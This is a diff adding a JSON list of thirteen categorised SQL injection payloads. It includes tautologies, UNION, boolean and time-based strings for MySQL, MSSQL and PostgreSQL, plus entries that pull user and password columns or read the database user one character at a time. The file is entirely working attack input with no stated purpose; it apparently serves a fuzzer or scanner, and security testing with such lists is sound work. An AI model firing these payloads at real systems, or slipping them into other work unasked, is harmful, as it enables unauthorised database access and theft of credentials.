@@ -1,0 +1,54 @@
+[
+  {
+    "payload": "'",
+    "category": "syntax error"
+  },
+  {
+    "payload": "' OR '1'='1",
+    "category": "classic"
+  },
+  {
+    "payload": "' OR 1=1--",
+    "category": "classic"
+  },
+  {
+    "payload": "' UNION SELECT NULL--",
+    "category": "union-based"
+  },
+  {
+    "payload": "' AND 1=2--",
+    "category": "boolean-based"
+  },
+  {
+    "payload": "' OR SLEEP(5)--",
+    "category": "time-based"
+  },
+  {
+    "payload": "'; WAITFOR DELAY '0:0:5'--",
+    "category": "mssql"
+  },
+  {
+    "payload": "'||(SELECT pg_sleep(5))--",
+    "category": "postgresql"
+  },
+  {
+    "payload": "' OR 1 GROUP BY CONCAT_WS(0x3a,user,password)--",
+    "category": "group concat"
+  },
+  {
+    "payload": "' AND LENGTH(user()) > 1--",
+    "category": "information_schema"
+  },
+  {
+    "payload": "' OR 'a'='a';--",
+    "category": "classic"
+  },
+  {
+    "payload": "' OR 1=CONVERT(int,(SELECT @@version))--",
+    "category": "mssql"
+  },
+  {
+    "payload": "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
+    "category": "data extraction"
+  }
+]
